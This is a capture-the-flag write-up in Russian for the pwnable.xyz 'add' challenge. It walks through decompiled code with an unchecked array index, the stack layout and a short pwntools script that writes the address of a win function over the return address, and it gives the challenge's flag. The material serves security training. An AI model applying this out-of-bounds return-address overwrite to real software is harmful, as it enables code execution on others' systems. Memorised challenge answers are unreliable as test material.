We did some subtraction, now let's do some addition.
svc.pwnable.xyz : 30002
Author: [uafio](https://pwnable.xyz/user/2/)
[download](https://pwnable.xyz/redisfiles/challenge_23.gz)

Исходный код:
``` C
void __fastcall main(int argc, const char **argv, const char **envp)
{
  __int64 a; // [rsp+8h] [rbp-78h] BYREF
  __int64 b; // [rsp+10h] [rbp-70h] BYREF
  __int64 c; // [rsp+18h] [rbp-68h] BYREF
  _QWORD arr[11]; // [rsp+20h] [rbp-60h] BYREF
  unsigned __int64 canary; // [rsp+78h] [rbp-8h]

  canary = __readfsqword(0x28u);
  setup(argc, argv, envp);
  while ( 1 )
  {
    a = 0;
    b = 0;
    c = 0;
    memset(arr, 0, 80u);
    printf("Input: ");
    if ( (unsigned int)__isoc99_scanf("%ld %ld %ld", &a, &b, &c) != 3 )
      break;
    arr[c] = a + b;
    printf("Result: %ld", arr[c]);
  }
}
```

Программа складывает числа `a` и `b`, а результат записывает в `arr[c]`, где `c` - индекс в массиве. Уязвимость: нет проверки выхода за пределы массива. Необходимо переписать адрес возварата.

Функция, которую нужно вызвать:
```
.text:0000000000400822                 public win
.text:0000000000400822 win             proc near
.text:0000000000400822 ; __unwind {
.text:0000000000400822                 push    rbp
.text:0000000000400823                 mov     rbp, rsp
.text:0000000000400826                 lea     rdi, command    ; "cat /flag"
.text:000000000040082D                 call    _system
.text:0000000000400832                 nop
.text:0000000000400833                 pop     rbp
.text:0000000000400834                 retn
.text:0000000000400834 ; } // starts at 400822
.text:0000000000400834 win             endp
```

Стек:
```
-0000000000000060     _QWORD arr[11];
-0000000000000008     _QWORD canary;
+0000000000000000     _QWORD __saved_registers;
+0000000000000008     _UNKNOWN *__return_address;
```
Необходимый индекс: 11 + 1 + 1 = 13.

Эксплоит:
``` python
io = start()

addr = 0x400822
index = 13
payload = (f'{addr} 0 {index}').encode()
io.sendlineafter(b': ', payload)
io.sendlineafter(b': ', b'a') # выход из цикла

io.interactive()
```

Запуск:
![](../../../z.%20Images/{859613A4-4DF8-4DBF-A6B6-22F29CCEF892}.png)

Ответ: `FLAG{easy_00b_write}`